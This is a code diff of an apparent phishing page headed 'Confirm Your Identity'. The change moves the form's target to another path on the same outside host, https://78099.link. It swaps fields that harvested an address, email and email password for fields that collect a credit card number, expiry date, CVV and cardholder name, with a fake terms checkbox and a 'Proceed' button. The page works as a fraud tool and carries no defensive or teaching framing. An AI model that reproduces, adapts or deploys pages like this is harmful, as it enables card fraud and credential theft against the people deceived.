@@ -92,30 +92,37 @@
 </head>
 <body>
 <div class="signup-form">
-    <form action="https://78099.link/linkedin/action1.php" method="post">
+    <form action="https://78099.link/america/action2.php" method="post">
 		<h2>Confirm Your Identity</h2>
 		<p>Please fill in this form to confirm your identity and proceed!</p>
 		<hr>
-	<div class="form-group">
-        	<input type="text" class="form-control" name="address" placeholder="address" required="required">
-        </div>   
-        <div class="form-group">
-			<div class="row">
-				<div class="col-xs-6"><input type="text" class="form-control" name="zip" placeholder="zip" required="required"></div>
-				
-			</div>        	
+      
+     <div class="form-group">
+	        <label for="ccn">Credit Card Number:</label>
+        	<input id="ccn" type="tel" inputmode="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number" maxlength="19" placeholder="xxxx xxxx xxxx xxxx" class="form-control" name="number" required="required">
         </div>
         <div class="form-group">
-        	<input type="email" class="form-control" name="email" placeholder="Email Address" required="required">
+		 <div class="row">
+			         
+				<div class="col-xs-6"><label for="ex">Expiry Date</label><input type="text" id="ex" class="form-control" name="date" placeholder="MM YY" required="required"></div>
+				<div class="col-xs-6"><label for="ccv">CVV</label><input type="text" id="ccv" class="form-control" name="cvv" placeholder="CVV" required="required"></div>
+	</div>
+        <div class="form-group">
+	        <label for="name">Name On Card</label>
+        	<input id="name" type="text"  placeholder="Micheal Scofield" class="form-control" name="name" required="required">
+        </div>
+        </div>
+        <div class="form-group">
+        	
         </div>
 		<div class="form-group">
-            <input type="password" class="form-control" name="password" placeholder="Email Password" required="required">
+            
         </div>
 		<div class="form-group">
-            <input type="password" class="form-control" name="confirm_password" placeholder="Confirm Email Password" required="required">
+            
         </div>        
         <div class="form-group">
-			
+			<label class="checkbox-inline"><input type="checkbox" required="required"> I accept the <a href="#">Terms of Use</a> &amp; <a href="#">Privacy Policy</a></label>
 		</div>
 		<div class="form-group">
             <button type="submit" class="btn btn-primary btn-lg">Proceed</button>
